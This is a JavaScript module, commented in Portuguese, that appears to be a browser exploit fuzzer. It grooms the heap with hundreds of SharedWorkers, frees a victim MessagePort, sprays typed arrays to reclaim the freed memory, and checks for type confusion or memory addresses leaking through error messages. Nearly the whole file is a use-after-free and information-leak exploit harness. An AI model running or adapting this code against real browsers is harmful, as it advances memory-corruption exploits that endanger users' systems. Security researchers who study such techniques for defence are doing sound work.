import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { prepare_checkerboard_heap, clear_heap } from './heap.mjs';
import { build_leak_probe } from './payloads.mjs';

var workers_stash = [];
var current_test_idx = 0;
var is_running = false;

// ========================================================
// INICIALIZAÇÃO (Conecta ao HTML)
// ========================================================
function init() {
    log("Módulo carregado. Pronto para iniciar.", "success");
    
    const btnRun = document.getElementById("btn_run");
    const btnStop = document.getElementById("btn_stop");

    if(btnRun) btnRun.addEventListener("click", start_fuzzer);
    if(btnStop) btnStop.addEventListener("click", stop_fuzzer);
}

// ========================================================
// CONTROLE DE FLUXO
// ========================================================
function stop_fuzzer() {
    is_running = false;
    log("Parando testes...", "warn");
    cleanup_round();
}

async function start_fuzzer() {
    if (!window.SharedWorker) return log("ERRO: Navegador incompatível.", "fail");
    if (is_running) return;

    is_running = true;
    current_test_idx = 0;
    log(">>> INICIANDO FUZZER DE LEAK (0x20 -> 0x1000) <<<", "warn");
    
    test_next_size();
}

function test_next_size() {
    if (!is_running) return;

    if (current_test_idx >= CONFIG.SIZES_TO_TEST.length) {
        log("CICLO CONCLUÍDO. Nenhum leak óbvio encontrado.", "warn");
        is_running = false;
        return;
    }

    const size = CONFIG.SIZES_TO_TEST[current_test_idx];
    log(`[...] Testando Tamanho: 0x${size.toString(16).toUpperCase()}`);

    // 1. Prepara Memória
    prepare_checkerboard_heap(size);
    
    // 2. Payload Específico
    const payload = build_leak_probe(size);

    // 3. Inicia Trigger
    run_trigger(payload, size);
}

// ========================================================
// TRIGGER (WORKER 403)
// ========================================================
function run_trigger(payload, size) {
    let p_count = 0;
    const limit = CONFIG.WORKER_LIMIT - 380; // Cria ~23 workers de pressão

    // Limpa stash anterior
    workers_stash = [];

    // Base Grooming rápido
    for(let i=0; i<380; i++) {
        try { workers_stash.push(new SharedWorker("data:text/javascript,1", "g"+i)); } catch(e){}
    }

    const interval = setInterval(() => {
        if (!is_running) { clearInterval(interval); return; }

        if (p_count >= limit) {
            clearInterval(interval);
            
            // Pega a última vítima (403)
            const victim = workers_stash.pop();
            
            // Tenta o Leak
            const result = attempt_leak(victim, payload, size);
            
            // Limpa para o próximo round
            cleanup_round();
            clear_heap();
            
            if (result) {
                log("!!! LEAK CONFIRMADO !!! PAUSANDO TESTES.", "leak");
                is_running = false;
                alert("SUCESSO! Leak encontrado no tamanho: 0x" + size.toString(16));
            } else {
                // Falhou, próximo tamanho
                current_test_idx++;
                setTimeout(test_next_size, 500); // Pequeno delay
            }
            return;
        }

        try {
            // Aloca na zona preparada
            let w = new SharedWorker("data:text/javascript,1", "v_" + size + "_" + p_count);
            w.port.start();
            workers_stash.push(w);
        } catch(e) {}
        
        p_count++;
    }, 50);
}

// ========================================================
// SONDA DE LEAK (O Pulo do Gato)
// ========================================================
function attempt_leak(victim, payload, size) {
    const port = victim.port;
    
    // 1. FREE
    victim.port.close();
    
    // 2. SPRAY (Reclaim com Zeros/Marcadores)
    const spray = [];
    for (let k = 0; k < CONFIG.SPRAY_QUANTITY; k++) {
        spray.push(new Uint32Array(payload));
    }

    // 3. LEITURA
    try {
        // Força conversão para string. Se o ponteiro interno foi corrompido
        // por zeros ou lixo, o JS pode cuspir um endereço de memória no erro ou no resultado.
        const s = port.toString();
        
        // Se não for mais [object MessagePort], algo mudou!
        if (s.indexOf("MessagePort") === -1) {
            log(`MUDANÇA DE TIPO DETECTADA: ${s}`, "success");
            return true;
        }
        
        // Teste 2: Tentar ler propriedade que não existe
        // Às vezes isso acessa memória inválida e o erro diz "0x824..."
        const test = port.onmessage;
        
    } catch (e) {
        // Analisa o erro por números hexadecimais
        const msg = e.toString();
        log(`Erro no tamanho 0x${size.toString(16)}: ${msg}`, "info");
        
        // Regex simples para achar endereços de memória (0x...)
        if (msg.match(/0x[0-9a-fA-F]+/)) {
            log("ENDEREÇO DE MEMÓRIA ENCONTRADO NO ERRO!", "leak");
            return true;
        }
    }
    
    return false;
}

function cleanup_round() {
    workers_stash.forEach(w => { try { w.port.close(); } catch(e){} });
    workers_stash = [];
}

// Inicializa
init();
